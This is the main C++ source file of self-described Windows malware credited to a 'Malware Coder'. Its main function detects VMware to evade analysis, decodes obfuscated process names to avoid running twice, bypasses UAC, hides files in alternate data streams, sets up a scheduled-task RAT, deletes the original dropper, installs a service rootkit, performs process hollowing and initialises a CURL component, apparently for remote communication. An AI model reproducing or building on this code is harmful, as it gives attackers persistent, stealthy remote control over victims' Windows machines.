/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include <iostream>
#include "AntiVM.h"
#include "Tools.h"
#include "Bypass_UAC.h"
#include "ADS.h"
#include "Service.h"
#include "TaskScheduler.h"
#include "ProcessHollowing.h"
#include "CURL.h"

int main()
{

#ifndef TESTING

	if (ANTIVM::IsVMWare())
		return 0;

#endif // !TESTING

	// Initializing Tools
	Tools tool;

	// Check if the malware is already running
	if (tool.GetThisProgramPath().find(tool.decode("ecsSowndWiskTatyriu")) == std::string::npos && tool.GetThisProgramPath().find(tool.decode("p.elehex")) == std::string::npos) // decode -> WindowsSecurityTask , help.exe
	{
		if (tool.isProcessRunning(tool.GetMyName() + "ecsSowndWik:asyTitur") || tool.isProcessRunning("p.elehex")) // decode -> :WindowsSecurityTask, help.exe
			return 0;

		// Sleep(11000); //// is it good idea?? (Anti-Windows-Defender-Technique)
	}

	// Hide Files
	ADS ads;

	// Bypass UAC
	BypassUAC uac;
	if (!uac.IsProcessElevated())
		if (uac.UAC())
			return 1;

	// Create Task RAT && Delete the original Malware
	if (uac.IsProcessElevated())
	{
		TaskScheduler sch;
		if (sch.isTaskExists(tool.HIDE_NAME))
			ads.DeleteTheOriginalMalware();
	}

	// Create and Start Service Rootkit
	if (uac.IsProcessElevated())
		Service service;

	// Process Hollowing (64-bit)
	if (!tool.isSystem32Bit() && tool.GetThisProgramPath().find(tool.decode("p.elehex")) == std::string::npos)
		ProcessHollowing ph;

	// Initializing CURL
	Curl curl;

	return 0;
}